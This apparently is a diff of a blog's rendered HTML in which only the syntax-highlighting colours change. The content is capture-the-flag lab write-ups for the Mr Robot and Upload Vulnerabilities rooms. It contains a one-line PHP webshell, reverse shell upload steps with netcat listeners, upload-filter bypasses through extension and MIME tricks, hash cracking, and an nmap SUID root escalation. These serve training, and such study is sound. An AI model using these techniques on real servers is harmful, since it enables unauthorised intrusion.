 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-links-opml        <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 227<span style="color:#000">]</span>                                        
+</span></span><span style="display:flex;"><span>/wp-links-opml        <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 227<span style="color:#ff79c6">]</span>                                        
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-load              <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                          
+</span></span><span style="display:flex;"><span>/wp-load              <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span>                                          
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-login             <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 2613<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>/wp-login             <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 2613<span style="color:#ff79c6">]</span>                                       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-mail              <span style="color:#000">(</span>Status: 500<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 3064<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>/wp-mail              <span style="color:#ff79c6">(</span>Status: 500<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 3064<span style="color:#ff79c6">]</span>                                       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-settings          <span style="color:#000">(</span>Status: 500<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                          
+</span></span><span style="display:flex;"><span>/wp-settings          <span style="color:#ff79c6">(</span>Status: 500<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span>                                          
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/wp-signup            <span style="color:#000">(</span>Status: 302<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php?action<span style="color:#000">=</span>register<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>/wp-signup            <span style="color:#ff79c6">(</span>Status: 302<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php?action<span style="color:#ff79c6">=</span>register<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/xmlrpc               <span style="color:#000">(</span>Status: 405<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 42<span style="color:#000">]</span>                                                       
+</span></span><span style="display:flex;"><span>/xmlrpc               <span style="color:#ff79c6">(</span>Status: 405<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 42<span style="color:#ff79c6">]</span>                                                       
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>/xmlrpc.php           <span style="color:#000">(</span>Status: 405<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 42<span style="color:#000">]</span>                                                       
-</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
-</span></span><span style="display:flex;"><span>2022/05/10 12:24:21 <span style="color:#000">Finished</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
+</span></span><span style="display:flex;"><span>/xmlrpc.php           <span style="color:#ff79c6">(</span>Status: 405<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>Size: 42<span style="color:#ff79c6">]</span>                                                       
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/05/10 12:24:21 <span style="color:#8be9fd;font-style:italic">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">===============================================================</span>
 </span></span></code></pre></div><p>From this, we can be confident that WordPress is installed. This also mirrors what <a href="">Wappalyzer</a> tells us about the server&rsquo;s WordPress installation. Let&rsquo;s investigate some of the more interesting results from our <code>gobuster</code> scan.</p>
 <p>Visiting <code>http://&lt;target-ip&gt;/robots.txt</code> yields:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>User-agent: *
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>User-agent: *
 </span></span><span style="display:flex;"><span>fsocity.dic
 </span></span><span style="display:flex;"><span>key-1-of-3.txt
 </span></span></code></pre></div><p><code>fsocity.dic</code> is a dictionary wordlist file with many entries. This most likely contains the username and/or password of the WordPress installation.</p>
@@ -576,37 +576,37 @@ Methodology We begin our enumeration efforts by running an nmap scan on the targ
 <p>However, we know that WordPress relies on the execution of <code>.php</code> files to carry out work properly. Thus, we can simply use the platform&rsquo;s built-in text editor to replace the contents of an existing <code>.php</code> WordPress page with our reverse shell script. I went ahead and used <code>404.php</code>, as it is easily accessible and, honestly, it&rsquo;s just at the top of the list.</p>
 <p><img src="/images/mr-robot/mr-robot-ptm.png" alt="mr-robot-ptm"></p>
 <p>That worked nicely! We can then stabilize our shell via python with:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python -c <span style="color:#c41a16">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python -c <span style="color:#f1fa8c">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 </span></span><span style="display:flex;"><span>daemon@linux:/$ 
 </span></span></code></pre></div><p>and explore:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>daemon@linux:/$ ls
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>daemon@linux:/$ ls
 </span></span><span style="display:flex;"><span>ls
 </span></span><span style="display:flex;"><span>bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
 </span></span><span style="display:flex;"><span>boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
-</span></span><span style="display:flex;"><span>daemon@linux:/$ <span style="color:#a90d91">cd</span> home 
-</span></span><span style="display:flex;"><span><span style="color:#a90d91">cd</span> home
+</span></span><span style="display:flex;"><span>daemon@linux:/$ <span style="color:#8be9fd;font-style:italic">cd</span> home 
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> home
 </span></span><span style="display:flex;"><span>daemon@linux:/home$ ls
 </span></span><span style="display:flex;"><span>ls
 </span></span><span style="display:flex;"><span>robot
-</span></span><span style="display:flex;"><span>daemon@linux:/home$ <span style="color:#a90d91">cd</span> robot
-</span></span><span style="display:flex;"><span><span style="color:#a90d91">cd</span> robot
+</span></span><span style="display:flex;"><span>daemon@linux:/home$ <span style="color:#8be9fd;font-style:italic">cd</span> robot
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> robot
 </span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ls
 </span></span><span style="display:flex;"><span>ls
 </span></span><span style="display:flex;"><span>key-2-of-3.txt	password.raw-md5
 </span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ls -la
 </span></span><span style="display:flex;"><span>ls -la
-</span></span><span style="display:flex;"><span>total <span style="color:#1c01ce">16</span>
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#1c01ce">2</span> root  root  <span style="color:#1c01ce">4096</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> .
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#1c01ce">3</span> root  root  <span style="color:#1c01ce">4096</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> ..
-</span></span><span style="display:flex;"><span>-r-------- <span style="color:#1c01ce">1</span> robot robot   <span style="color:#1c01ce">33</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> key-2-of-3.txt
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#1c01ce">1</span> robot robot   <span style="color:#1c01ce">39</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> password.raw-md5
+</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#bd93f9">2</span> root  root  <span style="color:#bd93f9">4096</span> Nov <span style="color:#bd93f9">13</span>  <span style="color:#bd93f9">2015</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#bd93f9">3</span> root  root  <span style="color:#bd93f9">4096</span> Nov <span style="color:#bd93f9">13</span>  <span style="color:#bd93f9">2015</span> ..
+</span></span><span style="display:flex;"><span>-r-------- <span style="color:#bd93f9">1</span> robot robot   <span style="color:#bd93f9">33</span> Nov <span style="color:#bd93f9">13</span>  <span style="color:#bd93f9">2015</span> key-2-of-3.txt
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#bd93f9">1</span> robot robot   <span style="color:#bd93f9">39</span> Nov <span style="color:#bd93f9">13</span>  <span style="color:#bd93f9">2015</span> password.raw-md5
 </span></span></code></pre></div><p>We can&rsquo;t read <code>key-2-of-3.txt</code> yet, but we can access <code>password.raw-md5</code> for a hashed version of a password, likely for the <code>robot</code> user. We can use <a href="https://crackstation.net/">crackstation.net</a> to crack it, and, if not, probaby <a href="https://www.openwall.com/john/">John the Ripper</a>.</p>
 <p>Luckily, crackstation.net recognizes the hash and gives us the decoded password:</p>
 <p><img src="/media/mr-robot-crackstation.png" alt="mr-robot-crackstation"></p>
 <p>We can now switch users (<code>su</code>) to <code>robot</code> and read <code>key-2-of-3.txt</code>. Now that we have gotten the second flag, let&rsquo;s look to escalate our privileges for <code>root</code> access and, presumably, the third flag.</p>
 <p>As a shortcut to obtaining root access, We can search for system files that have an SUID (Set User ID) bit set. Files with SUID bits allow them to run with the permissions of whomever the owner of the file is. If the owner happens to be <code>root</code>, it runs with root permissions.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/tmp$ find / -perm -u<span style="color:#000">=</span>s -type f 2&gt;/dev/null
-</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#000">=</span>s -type f 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/tmp$ find / -perm -u<span style="color:#ff79c6">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#ff79c6">=</span>s -type f 2&gt;/dev/null
 </span></span><span style="display:flex;"><span>/bin/ping
 </span></span><span style="display:flex;"><span>/bin/umount
 </span></span><span style="display:flex;"><span>/bin/mount
@@ -626,17 +626,17 @@ Methodology We begin our enumeration efforts by running an nmap scan on the targ
 </span></span><span style="display:flex;"><span>/usr/lib/pt_chown
 </span></span></code></pre></div><p>We see that <code>nmap</code> in <code>/usr/local/bin/nmap</code>, interestingly, has an SUID bit set. Nice.</p>
 <p>By checking <a href="https://gtfobins.github.io/gtfobins/nmap/#suid">GTFOBins</a> for <code>nmap</code> SUID escalations, we see that we can invoke <code>nmap</code>&rsquo;s &ldquo;interactive mode&rdquo; (available on versions 2.02 to 5.21, which can be used to execute shell commands via <code>nmap&gt; !sh</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/$ /usr/local/bin/nmap --interactive
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/$ /usr/local/bin/nmap --interactive
 </span></span><span style="display:flex;"><span>/usr/local/bin/nmap --interactive
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Starting nmap V. 3.81 <span style="color:#000">(</span> http://www.insecure.org/nmap/ <span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#a90d91">for</span> <span style="color:#a90d91">help</span>
+</span></span><span style="display:flex;"><span>Starting nmap V. 3.81 <span style="color:#ff79c6">(</span> http://www.insecure.org/nmap/ <span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#ff79c6">for</span> <span style="color:#8be9fd;font-style:italic">help</span>
 </span></span><span style="display:flex;"><span>nmap&gt; !/bin/sh
 </span></span><span style="display:flex;"><span>!/bin/sh
-</span></span><span style="display:flex;"><span><span style="color:#177500"># whoami</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># whoami</span>
 </span></span><span style="display:flex;"><span>whoami
 </span></span><span style="display:flex;"><span>root
-</span></span><span style="display:flex;"><span><span style="color:#177500"># </span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># </span>
 </span></span></code></pre></div><p>&hellip;<em>et voilà</em>! We have root access and, by extension, the third flag.</p>
 <h3 id="notes">Notes</h3>
 <p>In retrospect, I would&rsquo;ve checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy <code>gobuster</code> scan, potentially saving time.</p>
@@ -716,20 +716,20 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <h3 id="methodology">Methodology</h3>
 <h4 id="webshells">Webshells</h4>
 <p>For a given webpage with upload form, run something like a <a href="">GoBuster</a> scan on <code>dir</code> mode, using a relevant wordlist with <code>-w</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
 </span></span></code></pre></div><p>If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#000">&lt;?</span><span style="color:#000">php</span> 
-</span></span><span style="display:flex;"><span>	<span style="color:#a90d91">echo</span> <span style="color:#000">system</span>(<span style="color:#000">$_GET</span>[<span style="color:#c41a16">&#34;cmd&#34;</span>]);
-</span></span><span style="display:flex;"><span><span style="color:#633820">?&gt;</span><span style="color:#000">
-</span></span></span></code></pre></div><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php 
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">echo</span> system(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;cmd&#34;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
 <h4 id="remote-shell">Remote Shell</h4>
 <p>After editing and uploading the necessary reverse shell script, such as <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentest Monkey&rsquo;s 2007 PHP tool</a>, the attacking machine can invoke a <code>netcat</code> listener via the venerable</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span>
 </span></span></code></pre></div><p>The shell script will be activated by navigating to the uploaded shell&rsquo;s location on the server with a browser. This will give the attacker RCE capabillities on the target server, though ideally the reverse shell would then be stabilized with user privileges escalated.</p>
 <h4 id="question-51">Question 5.1</h4>
 <h5 id="run-a-gobuster-scan-on-the-website-using-the-syntax-from-the-screenshot-above-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?</h5>
 <p>Running:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 </span></span></code></pre></div><p>creates the following output:</p>
 <p><img src="/images/uv/uv-gobuster.png" alt="UV - Gobuster"></p>
 <h4 id="question-52">Question 5.2</h4>
@@ -852,7 +852,7 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>We will accomplish this by redeploying the Pentest Monkey remote shell script that we used to complete Task 5. Here, we will simply rename the file from <code>ptm-shell.php</code> to <code>shell.jpeg</code>, allowing it to pass through the server&rsquo;s filter. This is due to the fact that the file&rsquo;s inauthentic MIME type of <code>image/jpeg</code> is confirmed by its <code>.jpg</code> extension.</p>
 <p>Before initiating the upload, we need to do two things.</p>
 <p>First, we set up a <code>netcat</code> listener on our attack machine, just like in task 5, ensuring that the port value corresponds with the variable in the <code>shell.jpeg</code> script.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp &lt;port&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp &lt;port&gt;
 </span></span></code></pre></div><p>Second, we enable <code>interception</code> in BurpSuite.</p>
 <p>After initiating the upload, Burp will intercept the <code>POST</code> request. In the request details, we can see that the <code>filename</code> is set to <code>shell.jpeg</code>  and the <code>Content-type</code> value is set to <code>image/jpeg</code>, reflecting the whitelist constraint imposed by the server&rsquo;s JavaScript filter function.</p>
 <p>After modifying these two fields to <code>filename=&quot;shell.php&quot;</code> and <code>Content-type: text/x-php</code>, we can forward the request to the server. Once the upload has completed, we can navigate to <code>http://demo.uploadvulns.thm/uploads/shell.php</code>, which will execute our reverse shell script, spawning a shell in our <code>netcat</code> listener.</p>
@@ -873,7 +873,7 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>With the web page&rsquo;s file upload ability and destination established, we can &ldquo;hide&rdquo; our <code>ptm-shell.php</code> as <code>ptm-shell.png</code> and upload the file.</p>
 <p><img src="/images/uv/uv-java-coffee-ptm-png.png" alt="uv-java-shell-rename"></p>
 <p>We will then initiate our <code>netcat</code> listener:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#1c01ce">4444</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#bd93f9">4444</span>
 </span></span></code></pre></div><p>and we enable <code>interception</code> in Burp Suite. Then, we initiate the upload and edit the intercepted <code>POST</code> submission from our browser.</p>
 <p><img src="/images/uv/uv-java-burpint.png" alt="uv-java-burpint"></p>
 <p>After we have used <code>Forward</code> to send it along to the server, we can navigate to <code>http://java.uploadvulns.thm/images/ptm-shell.php</code> to execute our shell script. Our browser will be greeted with:</p>
@@ -887,21 +887,21 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <h3 id="methodology-1">Methodology</h3>
 <h4 id="evading-server-side-filters">Evading server-side filters</h4>
 <p>The first example for this task begins by introducing a website that uses the following PHP script to disallow or blacklist files that have <code>.php</code> or <code>.phtml</code> extensions with the following:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#000">&lt;?</span><span style="color:#000">php</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#177500">//Get the extension
-</span></span></span><span style="display:flex;"><span><span style="color:#177500"></span>    <span style="color:#000">$extension</span> <span style="color:#000">=</span> <span style="color:#000">pathinfo</span>(<span style="color:#000">$_FILES</span>[<span style="color:#c41a16">&#34;fileToUpload&#34;</span>][<span style="color:#c41a16">&#34;name&#34;</span>])[<span style="color:#c41a16">&#34;extension&#34;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#177500">//Check the extension against the blacklist -- .php and .phtml
-</span></span></span><span style="display:flex;"><span><span style="color:#177500"></span>    <span style="color:#a90d91">switch</span>(<span style="color:#000">$extension</span>){
-</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">case</span> <span style="color:#c41a16">&#34;php&#34;</span><span style="color:#000">:</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">case</span> <span style="color:#c41a16">&#34;phtml&#34;</span><span style="color:#000">:</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">case</span> <span style="color:#a90d91">NULL</span><span style="color:#000">:</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#000">$uploadFail</span> <span style="color:#000">=</span> <span style="color:#a90d91">True</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#a90d91">break</span>;
-</span></span><span style="display:flex;"><span>        <span style="color:#a90d91">default</span><span style="color:#000">:</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#000">$uploadFail</span> <span style="color:#000">=</span> <span style="color:#a90d91">False</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?</span>php
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//Get the extension
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">$extension</span> <span style="color:#ff79c6">=</span> pathinfo(<span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#34;fileToUpload&#34;</span>][<span style="color:#f1fa8c">&#34;name&#34;</span>])[<span style="color:#f1fa8c">&#34;extension&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//Check the extension against the blacklist -- .php and .phtml
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">switch</span>(<span style="color:#8be9fd;font-style:italic">$extension</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#34;php&#34;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> <span style="color:#f1fa8c">&#34;phtml&#34;</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> <span style="color:#ff79c6">NULL</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">$uploadFail</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">$uploadFail</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span><span style="color:#633820">?&gt;</span><span style="color:#000">
-</span></span></span></code></pre></div><p>This script checks the extension of the <code>fileToUpload</code> against the simple blacklist of <code>php</code> and <code>phtml</code>.</p>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">?&gt;</span>
+</span></span></code></pre></div><p>This script checks the extension of the <code>fileToUpload</code> against the simple blacklist of <code>php</code> and <code>phtml</code>.</p>
 <p>As we will need to upload a file with another extension, we must consider alternate approaches. The <a href="https://en.wikipedia.org/wiki/PHP">Wikipedia page for PHP</a>  introduce common extensions to look into, which are complemented by an array of uncommon, but executable, <code>PHP</code> formats, such as:</p>
 <ul>
 <li>.php3, .php4, .php5, .php7, .phps, .php-s, .pht and .phar</li>
@@ -910,7 +910,7 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p>The next example uses the same premise, but this time involving a server with an unknown filtering mechanism. This is known as doing it &ldquo;<em>black-box</em>.&rdquo;<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
 <p>We begin by verifying that a standard <code>.jpeg</code> file can be uploaded; and that a <code>shell.php</code> script can not. After experimenting with files to better understand what the server will and will not accept, we reach the conclusion that there are no shell extensions that will pass through the filter and also execute on the server.</p>
 <p>We then remember that the filtering mechanism in the previous example used <code>pathinfo()</code> to get the file&rsquo;s extension by parsing the characters after the final <code>.</code> in the filename.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#000">$extension</span> <span style="color:#000">=</span> <span style="color:#000">pathinfo</span>(<span style="color:#000">$_FILES</span>[<span style="color:#c41a16">&#34;fileToUpload&#34;</span>][<span style="color:#c41a16">&#34;name&#34;</span>])[<span style="color:#c41a16">&#34;extension&#34;</span>];
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$extension</span> <span style="color:#ff79c6">=</span> pathinfo(<span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#34;fileToUpload&#34;</span>][<span style="color:#f1fa8c">&#34;name&#34;</span>])[<span style="color:#f1fa8c">&#34;extension&#34;</span>];
 </span></span></code></pre></div><p>We then bypass the server&rsquo;s filter code by changing our payload&rsquo;s filename from <code>ptm-shell.php</code> to <code>ptm-shell.jpeg.php</code>, as the <code>PHP</code> script parses the file&rsquo;s extension as the characters that follow the final <code>.</code>.</p>
 <p>Before offering our task question, the text asks us to consider that these examples are among many possibilities for exploiting upload vulnerabilities.</p>
 <blockquote>
@@ -923,10 +923,10 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <p><img src="/images/uv/anx-home.png" alt="anx-home"></p>
 <p>First, we will upload a standard file to the server. Successsfully doing so will simultaneously give us a file to look for in the server&rsquo;s upload destination directory and also start informing us of which file formats pass through the filter. I will use the same <code>coffee.png</code> clip art file from the previous task for this purpose.</p>
 <p>We then begin our investigation by running a <code>gobuster</code> scan of <code>annex.uploadvulns.thm</code>:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o gb-annex
